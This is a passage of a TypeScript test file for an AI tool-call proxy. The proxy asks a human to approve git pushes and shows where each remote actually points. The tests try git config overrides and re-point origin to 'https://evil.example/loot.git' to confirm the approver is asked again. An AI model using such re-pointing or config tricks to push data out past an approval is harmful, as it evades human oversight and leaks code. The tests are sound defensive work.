      const push = request('git', 'git_push', { path: repo, remote: 'origin' });
      whitelist.add(candidateFor(viewOf(policy, sandbox, push), push).patterns[0]);

      const overrides: Array<[string, string]> = [
        ['http.proxy', 'http://127.0.0.1:9'],
        ['remote.origin.pushurl', GITHUB_ORIGIN],
        ['core.sshCommand', 'ssh -o ProxyCommand=true'],
      ];
      for (const [key, value] of overrides) {
        git(repo, 'config', key, value);
        const view = viewOf(policy, sandbox, push);
        expect(view.evaluation, key).toMatchObject({ decision: 'escalate', rule: 'structural-domain-escalate' });
        expect(view.evaluation.reason, key).toContain('"github.com/acme/project"');
        expect(candidateFor(view, push).patterns, key).toHaveLength(0);
        expect(whitelisted(whitelist, view, push), key).toBe(false);
        git(repo, 'config', '--unset', key);
      }

      expect(whitelisted(whitelist, viewOf(policy, sandbox, push), push)).toBe(true);
    });

    it('end to end: the approver sees where the remote goes, and is asked again after a re-point', async () => {
      const repo = initRepo(join(sandbox, 'pipeline'), GITHUB_ORIGIN);
      const callTool = vi.fn().mockResolvedValue({ content: [{ type: 'text', text: 'pushed' }] });
      const onEscalation = vi
        .fn<NonNullable<CallToolDeps['onEscalation']>>()
        .mockResolvedValueOnce({ decision: 'approved', whitelistSelection: 0 })
        .mockResolvedValue({ decision: 'denied' });
      const log = vi.fn();
      const tool: ProxiedTool = {
        serverName: 'git',
        name: 'git_push',
        inputSchema: {
          type: 'object',
          properties: { path: { type: 'string' }, remote: { type: 'string' }, branch: { type: 'string' } },
        },
      };
      const deps: CallToolDeps = {
        toolMap: new Map([['git_push', tool]]),
        policyEngine: engine(),
        auditLog: { log, assertWritable: vi.fn() } as unknown as CallToolDeps['auditLog'],
        circuitBreaker: {
          check: vi.fn().mockReturnValue({ allowed: true }),
        } as unknown as CallToolDeps['circuitBreaker'],
        clientStates: new Map<string, ClientState>([
          ['git', { client: { callTool } as unknown as ClientState['client'], roots: [] }],
        ]),
        resolvedSandboxConfigs: new Map<string, ResolvedSandboxConfig>([
          ['git', { sandboxed: false, reason: 'opt-out' }],
        ]),
        allowedDirectory: sandbox,
        escalationDir: undefined,
        autoApproveModel: null,
        serverContextMap: new Map(),
        whitelist: createApprovalWhitelist(),
        onEscalation,
      };

      // 1. The approver is shown the destination, not just "origin", and approves with /approve+.
      expect((await handleCallTool('git_push', { path: repo, remote: 'origin' }, deps)).isError).toBeUndefined();
      expect(onEscalation).toHaveBeenCalledTimes(1);
      const [, firstReason, , firstCandidates] = onEscalation.mock.calls[0];
      expect(firstReason).toBe('escalate-git-network applies (git remote: origin -> github.com/acme/project)');
      expect(firstCandidates).toEqual([
        {
          description: 'Allow git/git_push git-remote-url origin -> github.com/acme/project',
          scope: 'exact',
          patternKey: JSON.stringify(['git', 'git_push', [['domain', 'git-remote-url', 'github.com/acme/project']]]),
        },
      ]);

      // 2. Pushing to the same destination again needs no prompt, with or without the remote named.
      for (const args of [{ path: repo, remote: 'origin' }, { path: repo }]) {
        expect((await handleCallTool('git_push', args, deps)).isError).toBeUndefined();
      }
      expect(onEscalation).toHaveBeenCalledTimes(1);
      expect(callTool).toHaveBeenCalledTimes(3);
      expect(log.mock.calls.at(-1)?.[0]).toMatchObject({ whitelistApproved: true });

      // 3. After origin is re-pointed, the human is asked again and sees the new destination.
      git(repo, 'remote', 'set-url', 'origin', 'https://evil.example/loot.git');
      const denied = await handleCallTool('git_push', { path: repo, remote: 'origin' }, deps);
      expect(denied.isError).toBe(true);
      expect(onEscalation).toHaveBeenCalledTimes(2);
      expect(onEscalation.mock.calls[1][1]).toContain('origin -> evil.example/loot');
      expect(callTool).toHaveBeenCalledTimes(3);
    });
  });
});
